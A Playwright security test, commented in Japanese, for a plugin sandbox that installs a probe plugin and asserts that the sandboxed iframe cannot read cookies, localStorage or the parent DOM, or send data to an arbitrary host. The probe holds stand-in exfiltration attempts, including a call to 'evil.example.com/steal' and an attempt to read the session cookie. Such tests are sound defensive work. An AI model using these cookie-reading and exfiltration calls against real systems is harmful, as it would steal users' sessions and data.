// sandbox セキュリティ E2E。
// 実際のブラウザで、プラグインが親 DOM・Cookie・localStorage・任意 fetch に到達できないこと、
// 未宣言権限の RPC が拒否されることを検証する。

import { expect, test } from "@playwright/test";
import { ALLOWED_ORIGIN, apiUrl, readEnvelope } from "../helpers/api";
import { unique } from "../helpers/ids";

const OWNER_COOKIE = "oc_sess=e2e-owner-session-token";

const PROBE_CODE = `register({
  slots: {
    "thread-post-inline": async function ({ api, root }) {
      var result = {};

      try { result.cookie = String(document.cookie); } catch (error) { result.cookie = "BLOCKED"; }

      try {
        localStorage.setItem("oc_probe", "1");
        result.localStorage = "LEAK";
      } catch (error) { result.localStorage = "BLOCKED"; }

      try {
        result.parentDom = parent.document.body ? "LEAK" : "BLOCKED";
      } catch (error) { result.parentDom = "BLOCKED"; }

      try {
        var response = await fetch("https://api.example.com/leak");
        result.directFetch = "LEAK:" + response.status;
      } catch (error) { result.directFetch = "BLOCKED"; }

      try {
        await api.storage.get("k");
        result.undeclaredStorage = "LEAK";
      } catch (error) { result.undeclaredStorage = String(error.code || error.message); }

      try {
        await api.net.fetch({ url: "https://evil.example.com/steal" });
        result.netFetch = "LEAK";
      } catch (error) { result.netFetch = String(error.code || error.message); }

      var pre = document.createElement("pre");
      pre.id = "oc-probe-result";
      pre.textContent = JSON.stringify(result);
      root.appendChild(pre);
    }
  }
});`;

test.describe("sandbox セキュリティ", () => {
  test("プラグインは親 DOM/cookie/localStorage/任意 fetch に到達できず、未宣言権限 RPC が拒否される", async ({
    page,
  }) => {
    const name = unique("sandbox-probe");

    // 所有者として下書き作成（静的検査は公開時に走るため下書き保存は可能）
    const createResponse = await page.request.post(apiUrl("/v1/plugins"), {
      headers: { Origin: ALLOWED_ORIGIN, cookie: OWNER_COOKIE, "content-type": "application/json" },
      data: {
        manifest: {
          name,
          version: "1.0.0",
          summary: "sandbox プローブ",
          scope: ["personal"],
          permissions: ["ui:slot"],
          connectAllowlist: [],
          entry: "plugin.js",
          slots: ["thread-post-inline"],
          hooks: [],
        },
        code: PROBE_CODE,
        visibility: "private",
      },
    });
    expect(createResponse.status()).toBe(201);
    const created = await readEnvelope<{ id: string }>(createResponse);
    if (!created || !created.ok) throw new Error("プラグイン作成に失敗");
    const pluginId = created.data.id;

    // 個人用にインストール（所有者の下書きは許可される）
    const installResponse = await page.request.post(apiUrl(`/v1/plugins/${pluginId}/install`), {
      headers: { Origin: ALLOWED_ORIGIN, cookie: OWNER_COOKIE, "content-type": "application/json" },
      data: { scope: "personal" },
    });
    expect(installResponse.status()).toBe(201);

    // ブラウザでセッション Cookie を設定してデモページへ
    await page.context().addCookies([
      { name: "oc_sess", value: "e2e-owner-session-token", domain: "localhost", path: "/" },
    ]);
    await page.goto("/plugins/demo/");

    const hostFrame = page.locator(`iframe[title="${name} プラグイン"]`).first();
    await expect(hostFrame).toHaveCount(1);
    await expect(hostFrame).toHaveAttribute("sandbox", "allow-scripts");
    await expect(hostFrame).not.toHaveAttribute("sandbox", /allow-same-origin/);

    const frame = page.frameLocator(`iframe[title="${name} プラグイン"]`).first();
    const result = frame.locator("#oc-probe-result");
    await expect(result).toBeVisible({ timeout: 15_000 });

    const text = (await result.textContent()) ?? "";
    const parsed: Record<string, string> = JSON.parse(text);

    expect(parsed.cookie === "" || parsed.cookie === "BLOCKED").toBe(true);
    expect(parsed.cookie).not.toContain("oc_sess");
    expect(parsed.localStorage).toBe("BLOCKED");
    expect(parsed.parentDom).toBe("BLOCKED");
    expect(parsed.directFetch).toBe("BLOCKED");
    expect(parsed.undeclaredStorage).toBe("PERMISSION_DENIED");
    expect(parsed.netFetch).toBe("PERMISSION_DENIED");

    // 後始末（レジストリを汚さない）
    await page.request.post(apiUrl(`/v1/plugins/${pluginId}/uninstall`), {
      headers: { Origin: ALLOWED_ORIGIN, cookie: OWNER_COOKIE, "content-type": "application/json" },
      data: { scope: "personal" },
    });
    await page.request.delete(apiUrl(`/v1/plugins/${pluginId}`), {
      headers: { Origin: ALLOWED_ORIGIN, cookie: OWNER_COOKIE },
    });
  });
});